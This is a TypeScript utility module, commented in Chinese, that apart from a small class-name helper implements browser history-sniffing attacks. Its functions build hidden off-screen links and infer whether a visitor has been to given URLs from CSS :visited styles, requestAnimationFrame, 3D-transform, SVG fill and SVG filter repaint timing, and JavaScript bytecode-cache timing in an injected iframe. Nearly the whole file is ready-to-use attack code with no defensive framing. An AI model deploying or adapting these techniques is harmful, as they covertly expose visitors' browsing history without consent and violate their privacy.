import { clsx, type ClassValue } from "clsx"
import { twMerge } from "tailwind-merge"

export function cn(...inputs: ClassValue[]) {
  return twMerge(clsx(inputs))
}

/**
 * 使用时间差攻击检测用户是否访问过指定URL
 * 基于requestAnimationFrame的渲染时间差异
 */
export interface VisitedResult {
  url: string
  visited: boolean // 综合的访问状态
  timings?: number[] // RAF 目标URL的计时
  baselineTimings?: number[] // RAF 基线计时
  rafTime?: number // RAF 检测到的关键时间差或指标
  rafDetected?: boolean // RAF 是否检测到访问
  cssDetected?: boolean // CSS 是否检测到访问
  css3dDetected?: boolean // CSS 3D Transform是否检测到访问
  svgDetected?: boolean // SVG填充检测是否检测到访问
  bytecodeDetected?: boolean // JS字节码缓存检测是否检测到访问
  svgFilterDetected?: boolean // SVG过滤器检测是否检测到访问
  renderTimingDetected?: boolean // 渲染时间差异检测是否检测到访问
}

// 辅助函数：执行rAF时间测量
async function measureRafTimings(url: string, numLinks: number = 5, framesToTest: number = 25, modifyFrameIndex: number = 5): Promise<number[]> {
  return new Promise((resolve) => {
    const container = document.createElement('div');
    container.style.position = 'absolute';
    container.style.opacity = '0';
    container.style.pointerEvents = 'none';
    container.style.left = '-9999px';
    document.body.appendChild(container);

    const links: HTMLAnchorElement[] = [];
    for (let i = 0; i < numLinks; i++) {
      const link = document.createElement('a');
      link.href = url;
      // 使用极简样式，避免干扰计时
      link.style.fontSize = '1px';
      link.textContent = '.'; // Minimal content
      link.style.textShadow = '5px 5px 500px #999'; // 添加文本阴影增加渲染复杂度
      container.appendChild(link);
      links.push(link);
    }

    requestAnimationFrame(() => {
      const timings: number[] = [];
      let lastTime = performance.now();

      const testFrames = (frameCount: number = 0) => {
        const currentTime = performance.now();
        timings.push(currentTime - lastTime);
        lastTime = currentTime;

        if (frameCount >= framesToTest - 1) {
          document.body.removeChild(container);
          resolve(timings.slice(1)); // 忽略第一次测量，通常有较大误差
          return;
        }

        if (frameCount === modifyFrameIndex && url !== 'about:blank') {
          links.forEach(link => {
            // 修改链接的href，触发浏览器进行URL检查
            link.href = link.href + (link.href.includes('?') ? '&' : '?') + 'raf_test=' + Date.now();

            // "触碰"样式以触发Chrome的重绘 (关键步骤！)
            link.style.color = 'rgb(10,20,30)';
            void link.offsetHeight; // 强制浏览器重计算样式和布局
            link.style.color = ''; // 恢复默认颜色

            // 增加额外的样式变化，提高检测灵敏度
            link.style.textShadow = '3px 3px 5px #666';
            void link.offsetHeight;
            link.style.textShadow = '5px 5px 500px #999';
          });
        }
        requestAnimationFrame(() => testFrames(frameCount + 1));
      };
      requestAnimationFrame(() => testFrames()); // Start the first frame measurement
    });
  });
}

/**
 * 使用requestAnimationFrame检测用户是否访问过指定URL
 * 基于被访问链接重绘时间的异常模式来判断
 */
export async function checkIfLinkVisited(url: string): Promise<VisitedResult> {
  // 优化参数以提高检测灵敏度
  const numLinksForRaf = 5; // 增加链接数量，提高信号强度
  const framesToTestRaf = 25; // 增加帧数以获取更稳定的数据
  const modifyFrameIndexRaf = 7; // 延迟修改，让初始帧稳定
  const rafTimeDiffThreshold = 0.25; // ms, 认为rAF时间差异显著的阈值 (与基线中位数比较)
  const rafSpikeMultiplier = 1.8; // rAF峰值乘数 (与基线中位数比较)
  const consecutiveFramesNeeded = 2; // 需要连续几帧满足条件才判定为访问过

  // 先测量基线 (about:blank)，获取参考值
  const baselineTimings = await measureRafTimings('about:blank', numLinksForRaf, framesToTestRaf, -1);
  const sortedBaseline = [...baselineTimings].sort((a, b) => a - b);

  // 使用中位数代替平均值，避免异常值影响
  const midBaseline = sortedBaseline.length > 0
    ? sortedBaseline[Math.floor(sortedBaseline.length / 2)]
    : 0.5; // Fallback if empty

  // 去除极端值，计算基线标准差
  const filteredBaseline = sortedBaseline.filter(t =>
    t > midBaseline * 0.5 && t < midBaseline * 2.0
  );

  const baselineAvg = filteredBaseline.reduce((sum, t) => sum + t, 0) / filteredBaseline.length;
  const baselineVariance = filteredBaseline.reduce((sum, t) => sum + Math.pow(t - baselineAvg, 2), 0) / filteredBaseline.length;
  const baselineStdDev = Math.sqrt(baselineVariance);

  // 测量目标URL
  const targetTimings = await measureRafTimings(url, numLinksForRaf, framesToTestRaf, modifyFrameIndexRaf);

  let rafVisitDetected = false;
  let maxSpikeTime = 0;
  let consecutiveSpikes = 0;

  // 分析修改后的帧 (modifyFrameIndexRaf 之后)
  for (let i = modifyFrameIndexRaf + 1; i < targetTimings.length; i++) {
    const diff = targetTimings[i] - midBaseline;

    // 检测是否为显著尖峰 (有两种条件)
    const isSpike =
      (diff > rafTimeDiffThreshold && targetTimings[i] > midBaseline * rafSpikeMultiplier) || // 条件1: 绝对差异大且倍数高
      (targetTimings[i] > midBaseline + baselineStdDev * 3); // 条件2: 超过3个标准差

    if (isSpike) {
      consecutiveSpikes++;
      maxSpikeTime = Math.max(maxSpikeTime, targetTimings[i]);

      if (consecutiveSpikes >= consecutiveFramesNeeded) {
        rafVisitDetected = true;
        // 可以选择检测到足够的连续尖峰就停止
        // break;
      }
    } else {
      consecutiveSpikes = 0; // 重置连续计数
    }
  }

  // 查看目标时间序列的特征模式
  // 计算尖峰的位置分布，被访问过的链接通常会在修改后的帧附近出现集中的尖峰
  const peakFrames = [];
  for (let i = modifyFrameIndexRaf + 1; i < targetTimings.length; i++) {
    if (targetTimings[i] > midBaseline * rafSpikeMultiplier) {
      peakFrames.push(i - modifyFrameIndexRaf);
    }
  }

  // 如果尖峰集中在修改后的3-4帧内，增强检测可信度
  if (peakFrames.length >= 2 && peakFrames.filter(f => f <= 4).length >= 2) {
    rafVisitDetected = true;
  }

  // console.log(`URL: ${url}, RAF Detected: ${rafVisitDetected}, MaxSpike: ${maxSpikeTime.toFixed(2)}, MidBaseline: ${midBaseline.toFixed(2)}`);
  // console.log('Baseline Timings:', baselineTimings.map(t => t.toFixed(2)));
  // console.log('Target Timings:  ', targetTimings.map(t => t.toFixed(2)));

  return {
    url,
    visited: rafVisitDetected, // Initially, visited is based on RAF
    rafDetected: rafVisitDetected,
    timings: targetTimings,
    baselineTimings,
    rafTime: maxSpikeTime, // Store the most significant spike time
  };
}

/**
 * 使用CSS :visited状态检测方法
 * 通过创建元素并检查其计算样式
 */
export async function checkVisitedWithCSS(url: string): Promise<VisitedResult> {
  return new Promise((resolve) => {
    const container = document.createElement('div');
    container.style.position = 'absolute';
    container.style.opacity = '0';
    container.style.pointerEvents = 'none';
    container.style.left = '-9999px';
    document.body.appendChild(container);

    const styleId = 'visit-check-dynamic-style';
    // Ensure unique style ID if called multiple times rapidly
    const existingStyleElement = document.getElementById(styleId);
    if (existingStyleElement) {
      existingStyleElement.remove();
    }
    const styleElement = document.createElement('style');
    styleElement.id = styleId;

    // 使用下面几种CSS属性组合，增加检测成功率
    const unvisitedBackgroundColor = 'rgb(250, 250, 250)';
    const visitedBackgroundColor = 'rgb(248, 248, 248)';

    const unvisitedColor = 'rgb(44, 55, 66)';
    const visitedColor = 'rgb(11, 22, 33)';

    // 对于现代浏览器，尝试使用多种CSS属性
    styleElement.textContent = `
      a.css-visit-check {
        color: ${unvisitedColor} !important;
        background-color: ${unvisitedBackgroundColor} !important;
        text-decoration: none !important;
        transition: none !important;
        font-size: 16px !important;
        outline: 1px solid ${unvisitedColor} !important;
        border: 1px solid ${unvisitedColor} !important;
      }

      a.css-visit-check:visited {
        color: ${visitedColor} !important;
        background-color: ${visitedBackgroundColor} !important;
        outline: 1px solid ${visitedColor} !important;
        border: 1px solid ${visitedColor} !important;
      }
    `;
    document.head.appendChild(styleElement);

    // 创建多个链接，提高检测成功率
    const numLinks = 5;
    const links: HTMLAnchorElement[] = [];

    for (let i = 0; i < numLinks; i++) {
      const link = document.createElement('a');
      link.href = url;
      link.className = 'css-visit-check';
      link.textContent = 'CSS Visit Check ' + i;
      container.appendChild(link);
      links.push(link);
    }

    // 使用多种方法检测CSS属性变化
    setTimeout(() => {
      let cssVisitDetected = false;
      let detectedCount = 0;

      // 对每个链接应用多种检测方法
      for (const link of links) {
        try {
          // 方法1: 直接检查计算样式
          const computedStyle = window.getComputedStyle(link);

          // 检查多个CSS属性
          const colorDetected = computedStyle.getPropertyValue('color') === visitedColor;
          const bgDetected = computedStyle.getPropertyValue('background-color') === visitedBackgroundColor;
          const outlineDetected = computedStyle.getPropertyValue('outline-color') === visitedColor;

          // 如果任何属性被检测到变化，增加计数
          if (colorDetected || bgDetected || outlineDetected) {
            detectedCount++;
          }

          // 方法2: 使用Canvas间接检测
          // 由于安全原因，现代浏览器不会暴露真实的visited样式到JS中
          // 但我们仍留下此代码以处理可能的老浏览器
          try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            if (ctx) {
              canvas.width = 50;
              canvas.height = 20;
              // 注意：drawWindow API已经不被现代浏览器支持
              // 这里改为间接检测链接的位置和大小
              const rect = link.getBoundingClientRect();
              // 分析链接的位置和大小可能提供额外信息
              // 这是一个理论上的检测点，实际效果有限
            }
          } catch (e) {
            // 忽略任何错误
          }
        } catch (e) {
          // 忽略计算样式错误
        }
      }

      // 如果多数链接被检测为已访问，则增强结论可信度
      cssVisitDetected = detectedCount >= Math.ceil(numLinks / 2);

      // 清理DOM - 安全地移除元素
      if (container && container.parentNode === document.body) {
        document.body.removeChild(container);
      }
      if (document.getElementById(styleId)) {
        document.getElementById(styleId)?.remove();
      }

      resolve({
        url,
        visited: cssVisitDetected,
        cssDetected: cssVisitDetected,
      });
    }, 200); // 增加延迟，确保样式完全应用
  });
}

/**
 * 使用CSS 3D变换检测用户是否访问过特定URL
 * 通过CSS 3D变换的重绘时间差异来判断
 */
export async function checkVisitedWithCSS3DTransform(url: string): Promise<VisitedResult> {
  return new Promise((resolve) => {
    const container = document.createElement('div');
    container.style.position = 'absolute';
    container.style.opacity = '0';
    container.style.pointerEvents = 'none';
    container.style.left = '-9999px';
    document.body.appendChild(container);

    // 添加样式以使3D变换更加复杂和耗时
    const styleId = 'visit-check-3d-transform-style';
    const existingStyleElement = document.getElementById(styleId);
    if (existingStyleElement) {
      existingStyleElement.remove();
    }

    const styleElement = document.createElement('style');
    styleElement.id = styleId;

    // 访问过与未访问过链接的不同颜色值
    const visitedColorBase = 'rgb(11, 22, 33)';
    const unvisitedColorBase = 'rgb(44, 55, 66)';

    styleElement.textContent = `
      a.css3d-visit-check {
        display: inline-block;
        transform: perspective(100px) rotateY(37deg);
        filter: contrast(200%) drop-shadow(16px 16px 10px #fefefe) saturate(200%);
        text-shadow: 16px 16px 10px #fefffe;
        outline-width: 24px;
        font-size: 2px;
        text-align: center;
        color: ${unvisitedColorBase};
        background-color: ${unvisitedColorBase};
        outline-color: ${unvisitedColorBase};
      }
      a.css3d-visit-check:visited {
        color: ${visitedColorBase};
        background-color: ${visitedColorBase};
        outline-color: ${visitedColorBase};
      }
    `;
    document.head.appendChild(styleElement);

    // 创建多个链接元素，提高检测效果
    const numLinks = 5;
    const links: HTMLAnchorElement[] = [];

    for (let i = 0; i < numLinks; i++) {
      const link = document.createElement('a');
      link.href = url;
      link.className = 'css3d-visit-check';
      // 使用随机中文字符填充，增加渲染工作量
      link.textContent = Array(20).fill(0).map(() =>
        String.fromCharCode(Math.floor(Math.random() * 3000) + 19968)
      ).join('');
      container.appendChild(link);
      links.push(link);
    }

    // 使用requestAnimationFrame测量渲染性能
    let frameCountControl = 0;
    let frameCountTest = 0;
    const framesToMeasure = 30; // 测量这么多帧以确定有显著差异
    const startTimeControl = performance.now();

    // 创建一个已知未访问的链接作为基准测试
    const dummyUrl = "https://dummy-url-for-control-" + Math.random().toString(36);
    const controlLinks: HTMLAnchorElement[] = [];

    for (let i = 0; i < numLinks; i++) {
      const link = document.createElement('a');
      link.href = dummyUrl;
      link.className = 'css3d-visit-check';
      link.textContent = links[i].textContent;
      container.appendChild(link);
      controlLinks.push(link);
    }

    // 基准测试 - 在两个未访问链接之间切换
    const controlPingPong = () => {
      if (frameCountControl >= framesToMeasure) {
        // 基准测试完成，现在测试目标URL
        const endTimeControl = performance.now();
        const controlDuration = endTimeControl - startTimeControl;

        // 开始目标URL测试
        const startTimeTest = performance.now();

        const testPingPong = () => {
          if (frameCountTest >= framesToMeasure) {
            const endTimeTest = performance.now();
            const testDuration = endTimeTest - startTimeTest;

            // 检测性能下降比例
            // 若目标URL已访问，testDuration会显著大于controlDuration
            const performanceRatio = testDuration / controlDuration;
            const css3dVisitDetected = performanceRatio > 1.5; // 阈值根据测试确定

            // 清理DOM - 安全地移除元素
            if (container && container.parentNode === document.body) {
              document.body.removeChild(container);
            }
            if (document.getElementById(styleId)) {
              document.getElementById(styleId)?.remove();
            }

            resolve({
              url,
              visited: css3dVisitDetected,
              css3dDetected: css3dVisitDetected,
            });
            return;
          }

          // 在目标URL和dummy URL之间切换以触发重绘
          links.forEach((link, i) => {
            // 交替改变链接地址，触发重绘
            link.href = (frameCountTest % 2 === 0) ? url : dummyUrl;
            // 模拟"触碰"样式以触发Chrome的重绘
            link.style.color = 'red';
            void link.offsetHeight;
            link.style.color = '';
          });

          frameCountTest++;
          requestAnimationFrame(testPingPong);
        };

        testPingPong();
        return;
      }

      // 在两个已知未访问的URL之间切换
      controlLinks.forEach((link, i) => {
        link.href = (frameCountControl % 2 === 0) ?
          dummyUrl : "https://another-dummy-url-" + Math.random().toString(36);
        link.style.color = 'red';
        void link.offsetHeight;
        link.style.color = '';
      });

      frameCountControl++;
      requestAnimationFrame(controlPingPong);
    };

    requestAnimationFrame(controlPingPong);
  });
}

/**
 * 使用SVG填充检测用户是否访问过特定URL
 * 通过SVG的填充颜色重绘时间差异来判断
 */
export async function checkVisitedWithSVGFill(url: string): Promise<VisitedResult> {
  return new Promise((resolve) => {
    const container = document.createElement('div');
    container.style.position = 'absolute';
    container.style.opacity = '0';
    container.style.pointerEvents = 'none';
    container.style.left = '-9999px';
    document.body.appendChild(container);

    // 添加样式以使SVG填充更加复杂和耗时
    const styleId = 'visit-check-svg-fill-style';
    const existingStyleElement = document.getElementById(styleId);
    if (existingStyleElement) {
      existingStyleElement.remove();
    }

    const styleElement = document.createElement('style');
    styleElement.id = styleId;

    // 使用不同的颜色值，但肉眼几乎无法区分
    styleElement.textContent = `
      a.svg-visit-check svg * {fill: #ffffff;}
      a.svg-visit-check svg *:nth-child(3n+1) {fill: #fffffe;}
      a.svg-visit-check svg *:nth-child(3n+2) {fill: #fffeff;}
      a.svg-visit-check:visited svg * {fill: #feffff;}
      a.svg-visit-check:visited svg *:nth-child(3n+1) {fill: #fefffe;}
      a.svg-visit-check:visited svg *:nth-child(3n+2) {fill: #fefeff;}
    `;
    document.head.appendChild(styleElement);

    // 创建一个复杂的SVG图像，包含大量路径元素
    const svgContent = `
      <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100">
        ${Array(100).fill(0).map((_, i) =>
          `<path d="M${i%10*10},${Math.floor(i/10)*10} L${i%10*10+8},${Math.floor(i/10)*10} L${i%10*10+4},${Math.floor(i/10)*10+8} Z" />`
        ).join('')}
      </svg>
    `;

    // 创建多个链接元素，每个都包含SVG，提高检测效果
    const numLinks = 3;
    const links: HTMLAnchorElement[] = [];

    for (let i = 0; i < numLinks; i++) {
      const link = document.createElement('a');
      link.href = url;
      link.className = 'svg-visit-check';
      link.innerHTML = svgContent;
      container.appendChild(link);
      links.push(link);
    }

    // 创建一个已知未访问的链接作为基准测试
    const dummyUrl = "https://dummy-url-for-svg-control-" + Math.random().toString(36);
    const controlLinks: HTMLAnchorElement[] = [];

    for (let i = 0; i < numLinks; i++) {
      const link = document.createElement('a');
      link.href = dummyUrl;
      link.className = 'svg-visit-check';
      link.innerHTML = svgContent;
      container.appendChild(link);
      controlLinks.push(link);
    }

    // 使用requestAnimationFrame测量渲染性能
    let frameCountControl = 0;
    let frameCountTest = 0;
    const framesToMeasure = 25;
    const startTimeControl = performance.now();

    // 基准测试 - 在两个未访问链接之间切换
    const controlPingPong = () => {
      if (frameCountControl >= framesToMeasure) {
        // 基准测试完成，现在测试目标URL
        const endTimeControl = performance.now();
        const controlDuration = endTimeControl - startTimeControl;

        // 开始目标URL测试
        const startTimeTest = performance.now();

        const testPingPong = () => {
          if (frameCountTest >= framesToMeasure) {
            const endTimeTest = performance.now();
            const testDuration = endTimeTest - startTimeTest;

            // 检测性能下降比例
            const performanceRatio = testDuration / controlDuration;
            const svgVisitDetected = performanceRatio > 1.4;

            // 清理DOM - 安全地移除元素
            if (container && container.parentNode === document.body) {
              document.body.removeChild(container);
            }
            if (document.getElementById(styleId)) {
              document.getElementById(styleId)?.remove();
            }

            resolve({
              url,
              visited: svgVisitDetected,
              svgDetected: svgVisitDetected,
            });
            return;
          }

          // 在目标URL和dummy URL之间切换
          links.forEach((link) => {
            link.href = (frameCountTest % 2 === 0) ? url : dummyUrl;
            link.style.color = 'red';
            void link.offsetHeight;
            link.style.color = '';
          });

          frameCountTest++;
          requestAnimationFrame(testPingPong);
        };

        testPingPong();
        return;
      }

      // 切换控制链接
      controlLinks.forEach((link) => {
        link.href = (frameCountControl % 2 === 0) ?
          dummyUrl : "https://another-dummy-url-" + Math.random().toString(36);
        link.style.color = 'red';
        void link.offsetHeight;
        link.style.color = '';
      });

      frameCountControl++;
      requestAnimationFrame(controlPingPong);
    };

    requestAnimationFrame(controlPingPong);
  });
}

/**
 * 使用SVG过滤器检测用户是否访问过特定URL
 * 基于SVG过滤器处理时间差异的检测方法
 * 参考: Pixel Perfect Timing Attacks with HTML5 (Black Hat USA 2013)
 */
export async function checkVisitedWithSVGFilter(url: string): Promise<VisitedResult> {
  return new Promise((resolve) => {
    const container = document.createElement('div');
    container.style.position = 'absolute';
    container.style.opacity = '0';
    container.style.pointerEvents = 'none';
    container.style.left = '-9999px';
    document.body.appendChild(container);

    // 创建SVG过滤器
    const svgNS = "http://www.w3.org/2000/svg";
    const svg = document.createElementNS(svgNS, "svg");
    svg.setAttribute("width", "0");
    svg.setAttribute("height", "0");

    // 创建一个复杂的SVG过滤器，使处理时间更明显
    const filter = document.createElementNS(svgNS, "filter");
    filter.setAttribute("id", "visit-check-filter");

    // 添加多个过滤器效果，增加计算复杂度
    const feGaussianBlur = document.createElementNS(svgNS, "feGaussianBlur");
    feGaussianBlur.setAttribute("stdDeviation", "2");
    filter.appendChild(feGaussianBlur);

    const feColorMatrix = document.createElementNS(svgNS, "feColorMatrix");
    feColorMatrix.setAttribute("type", "matrix");
    feColorMatrix.setAttribute("values", "1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 19 -9");
    filter.appendChild(feColorMatrix);

    const feComposite = document.createElementNS(svgNS, "feComposite");
    feComposite.setAttribute("operator", "arithmetic");
    feComposite.setAttribute("k1", "0");
    feComposite.setAttribute("k2", "1");
    feComposite.setAttribute("k3", "1");
    feComposite.setAttribute("k4", "0");
    filter.appendChild(feComposite);

    svg.appendChild(filter);
    document.body.appendChild(svg);

    // 创建样式
    const styleId = 'visit-check-svg-filter-style';
    const existingStyleElement = document.getElementById(styleId);
    if (existingStyleElement) {
      existingStyleElement.remove();
    }

    const styleElement = document.createElement('style');
    styleElement.id = styleId;

    // 为访问过的链接应用不同的过滤器
    styleElement.textContent = `
      a.svg-filter-check {
        color: black;
        text-decoration: none;
        display: inline-block;
        width: 200px;
        height: 50px;
      }
      a.svg-filter-check:visited {
        filter: url(#visit-check-filter);
      }
    `;
    document.head.appendChild(styleElement);

    // 创建测试链接
    const numLinks = 3;
    const links: HTMLAnchorElement[] = [];

    for (let i = 0; i < numLinks; i++) {
      const link = document.createElement('a');
      link.href = url;
      link.className = 'svg-filter-check';
      link.textContent = 'SVG Filter Check ' + i;
      container.appendChild(link);
      links.push(link);
    }

    // 创建对照组链接（确保未访问过）
    const dummyUrl = "https://dummy-url-for-svg-filter-" + Math.random().toString(36);
    const controlLinks: HTMLAnchorElement[] = [];

    for (let i = 0; i < numLinks; i++) {
      const link = document.createElement('a');
      link.href = dummyUrl;
      link.className = 'svg-filter-check';
      link.textContent = 'SVG Filter Control ' + i;
      container.appendChild(link);
      controlLinks.push(link);
    }

    // 使用Performance API测量渲染时间
    setTimeout(() => {
      // 测量目标链接的渲染时间
      const targetTimes: number[] = [];
      const controlTimes: number[] = [];

      // 执行多次测量以获得更可靠的结果
      const iterations = 5;
      let currentIteration = 0;

      const runMeasurement = () => {
        if (currentIteration >= iterations) {
          // 计算平均渲染时间
          const avgTargetTime = targetTimes.reduce((sum, time) => sum + time, 0) / targetTimes.length;
          const avgControlTime = controlTimes.reduce((sum, time) => sum + time, 0) / controlTimes.length;

          // 如果目标链接的渲染时间明显长于对照组，则认为链接已被访问
          const timeDiff = avgTargetTime - avgControlTime;
          const svgFilterDetected = timeDiff > 1.0; // 阈值根据测试调整

          // 清理DOM - 安全地移除元素
          if (container && container.parentNode === document.body) {
            document.body.removeChild(container);
          }
          if (svg && svg.parentNode === document.body) {
            document.body.removeChild(svg);
          }
          if (document.getElementById(styleId)) {
            document.getElementById(styleId)?.remove();
          }

          resolve({
            url,
            visited: svgFilterDetected,
            svgFilterDetected
          });
          return;
        }

        // 测量目标链接渲染时间
        const targetStart = performance.now();
        links.forEach(link => {
          // 强制重绘
          link.style.textDecoration = 'underline';
          void link.offsetHeight;
          link.style.textDecoration = 'none';
        });
        const targetEnd = performance.now();
        targetTimes.push(targetEnd - targetStart);

        // 测量对照组链接渲染时间
        const controlStart = performance.now();
        controlLinks.forEach(link => {
          // 强制重绘
          link.style.textDecoration = 'underline';
          void link.offsetHeight;
          link.style.textDecoration = 'none';
        });
        const controlEnd = performance.now();
        controlTimes.push(controlEnd - controlStart);

        currentIteration++;
        setTimeout(runMeasurement, 20); // 短暂延迟后继续下一次测量
      };

      runMeasurement();
    }, 100);
  });
}

/**
 * 使用渲染时间差异检测用户是否访问过特定URL
 * 基于MozAfterPaint事件或requestAnimationFrame的渲染时间差异
 */
export async function checkVisitedWithRenderTiming(url: string): Promise<VisitedResult> {
  return new Promise((resolve) => {
    const container = document.createElement('div');
    container.style.position = 'absolute';
    container.style.opacity = '0';
    container.style.pointerEvents = 'none';
    container.style.left = '-9999px';
    document.body.appendChild(container);

    // 创建样式
    const styleId = 'visit-check-render-timing-style';
    const existingStyleElement = document.getElementById(styleId);
    if (existingStyleElement) {
      existingStyleElement.remove();
    }

    const styleElement = document.createElement('style');
    styleElement.id = styleId;

    // 为访问过的链接应用复杂的样式变化
    styleElement.textContent = `
      a.render-timing-check {
        color: black;
        text-decoration: none;
        display: inline-block;
        width: 200px;
        height: 50px;
        transition: none !important;
      }
      a.render-timing-check:visited {
        background-image: linear-gradient(45deg, rgba(0,0,0,0.1) 25%, transparent 25%, transparent 50%, rgba(0,0,0,0.1) 50%, rgba(0,0,0,0.1) 75%, transparent 75%, transparent);
        background-size: 4px 4px;
        box-shadow: 0 0 5px rgba(0,0,0,0.1);
      }
    `;
    document.head.appendChild(styleElement);

    // 创建测试链接
    const numLinks = 5;
    const links: HTMLAnchorElement[] = [];

    for (let i = 0; i < numLinks; i++) {
      const link = document.createElement('a');
      link.href = url;
      link.className = 'render-timing-check';
      link.textContent = 'Render Timing Check ' + i;
      container.appendChild(link);
      links.push(link);
    }

    // 创建对照组链接（确保未访问过）
    const dummyUrl = "https://dummy-url-for-render-timing-" + Math.random().toString(36);
    const controlLinks: HTMLAnchorElement[] = [];

    for (let i = 0; i < numLinks; i++) {
      const link = document.createElement('a');
      link.href = dummyUrl;
      link.className = 'render-timing-check';
      link.textContent = 'Render Timing Control ' + i;
      container.appendChild(link);
      controlLinks.push(link);
    }

    // 使用requestAnimationFrame测量渲染时间
    setTimeout(() => {
      const targetTimes: number[] = [];
      const controlTimes: number[] = [];

      // 执行多次测量以获得更可靠的结果
      const iterations = 10;
      let currentIteration = 0;

      const runMeasurement = () => {
        if (currentIteration >= iterations) {
          // 计算平均渲染时间
          const avgTargetTime = targetTimes.reduce((sum, time) => sum + time, 0) / targetTimes.length;
          const avgControlTime = controlTimes.reduce((sum, time) => sum + time, 0) / controlTimes.length;

          // 如果目标链接的渲染时间明显长于对照组，则认为链接已被访问
          const timeDiff = avgTargetTime - avgControlTime;
          const renderTimingDetected = timeDiff > 0.5; // 阈值根据测试调整

          // 清理DOM - 安全地移除元素
          if (container && container.parentNode === document.body) {
            document.body.removeChild(container);
          }
          if (document.getElementById(styleId)) {
            document.getElementById(styleId)?.remove();
          }

          resolve({
            url,
            visited: renderTimingDetected,
            renderTimingDetected
          });
          return;
        }

        // 测量目标链接渲染时间
        let targetStart = 0;
        let targetEnd = 0;

        requestAnimationFrame(() => {
          targetStart = performance.now();
          links.forEach(link => {
            // 强制重绘
            link.style.color = 'red';
            void link.offsetHeight;
            link.style.color = 'black';
          });

          requestAnimationFrame(() => {
            targetEnd = performance.now();
            targetTimes.push(targetEnd - targetStart);

            // 测量对照组链接渲染时间
            let controlStart = 0;
            let controlEnd = 0;

            requestAnimationFrame(() => {
              controlStart = performance.now();
              controlLinks.forEach(link => {
                // 强制重绘
                link.style.color = 'red';
                void link.offsetHeight;
                link.style.color = 'black';
              });

              requestAnimationFrame(() => {
                controlEnd = performance.now();
                controlTimes.push(controlEnd - controlStart);

                currentIteration++;
                setTimeout(runMeasurement, 20); // 短暂延迟后继续下一次测量
              });
            });
          });
        });
      };

      runMeasurement();
    }, 100);
  });
}

/**
 * 创建和添加隐藏的检测链接
 * 返回创建的DOM节点，供后续读取状态
 */
export function createDetectionLinks(urls: string[]): HTMLElement {
  const container = document.createElement('div');
  container.style.position = 'fixed';
  container.style.width = '0';
  container.style.height = '0';
  container.style.overflow = 'hidden';
  container.style.opacity = '0';

  urls.forEach((url, index) => {
    const link = document.createElement('a');
    link.href = url;
    link.dataset.id = `visit-check-${index}`;
    link.className = 'visit-check-link';
    link.textContent = url;
    container.appendChild(link);
  });

  document.body.appendChild(container);
  return container;
}

/**
 * 使用JS字节码缓存检测用户是否访问过特定网站
 * 通过测量脚本启动时间差异来判断
 */
export async function checkVisitedWithByteCodeCache(url: string): Promise<VisitedResult> {
  return new Promise((resolve) => {
    const targetScriptUrl = new URL('/main.js', url).href;
    const container = document.createElement('div');
    container.style.position = 'absolute';
    container.style.opacity = '0';
    container.style.pointerEvents = 'none';
    container.style.left = '-9999px';
    document.body.appendChild(container);

    // 创建一个iframe来隔离对主页面的影响
    const iframe = document.createElement('iframe');
    iframe.style.width = '0';
    iframe.style.height = '0';
    iframe.style.border = 'none';
    container.appendChild(iframe);

    if (!iframe.contentWindow) {
      // 安全地移除容器元素
      if (container && container.parentNode === document.body) {
        document.body.removeChild(container);
      }
      resolve({
        url,
        visited: false,
        bytecodeDetected: false
      });
      return;
    }

    // 在iframe中设置监听脚本加载时间
    iframe.contentWindow.document.open();
    iframe.contentWindow.document.write(`
      <!DOCTYPE html>
      <html>
      <head>
        <script>
          // 获取脚本下载完成时间
          var scriptStartTime;
          var scriptLoadTime;
          var processingTime;

          // 使用性能API监控资源加载
          performance.setResourceTimingBufferSize(100);

          // 设置一个初始标记
          performance.mark('bytecode_cache_test_start');

          function loadScript() {
            // 记录开始时间
            scriptStartTime = performance.now();

            // 创建脚本元素
            var script = document.createElement('script');
            script.src = "${targetScriptUrl}?_=" + Math.random();

            // 监听脚本加载事件
            script.onload = function() {
              // 记录加载完成时间
              scriptLoadTime = performance.now();

              // 计算处理时间（排除网络加载时间）
              var entries = performance.getEntriesByName(script.src);
              if (entries.length > 0) {
                var entry = entries[0];
                // 从资源加载完成到脚本执行完成的时间
                processingTime = scriptLoadTime - scriptStartTime - (entry.responseEnd - entry.fetchStart);

                // 如果处理时间异常短，可能说明使用了字节码缓存
                parent.postMessage({
                  type: 'bytecode_cache_result',
                  url: "${url}",
                  processingTime: processingTime,
                  isCached: processingTime < 5 // 阈值根据实际情况调整
                }, '*');
              } else {
                // 如果无法获取性能数据，使用简单的加载时间判断
                parent.postMessage({
                  type: 'bytecode_cache_result',
                  url: "${url}",
                  loadTime: scriptLoadTime - scriptStartTime,
                  isCached: (scriptLoadTime - scriptStartTime) < 10 // 阈值根据实际情况调整
                }, '*');
              }
            };

            script.onerror = function() {
              parent.postMessage({
                type: 'bytecode_cache_error',
                url: "${url}"
              }, '*');
            };

            document.head.appendChild(script);
          }

          // 延迟一点时间再加载脚本，确保iframe已完全初始化
          setTimeout(loadScript, 100);

          // 错误处理函数
          window.onerror = function(message, source, lineno, colno, error) {
            parent.postMessage({
              type: 'bytecode_cache_error',
              url: "${url}",
              error: message
            }, '*');
            return true; // 阻止错误继续传播
          };
        </script>
      </head>
      <body>
        <!-- 用于字节码缓存检测的空白页 -->
      </body>
      </html>
    `);
    iframe.contentWindow.document.close();

    // 处理来自iframe的消息
    const messageHandler = (event: MessageEvent) => {
      if (event.data.type === 'bytecode_cache_result') {
        window.removeEventListener('message', messageHandler);
        // 安全地移除容器元素
        if (container && container.parentNode === document.body) {
          document.body.removeChild(container);
        }

        resolve({
          url,
          visited: event.data.isCached,
          bytecodeDetected: event.data.isCached
        });
      } else if (event.data.type === 'bytecode_cache_error') {
        window.removeEventListener('message', messageHandler);
        // 安全地移除容器元素
        if (container && container.parentNode === document.body) {
          document.body.removeChild(container);
        }

        resolve({
          url,
          visited: false,
          bytecodeDetected: false
        });
      }
    };

    window.addEventListener('message', messageHandler);

    // 设置超时，防止长时间挂起
    setTimeout(() => {
      window.removeEventListener('message', messageHandler);

      // 安全地移除容器元素，先检查它是否仍然是document.body的子节点
      if (container && container.parentNode === document.body) {
        document.body.removeChild(container);
      }

      resolve({
        url,
        visited: false,
        bytecodeDetected: false
      });
    }, 5000);
  });
}
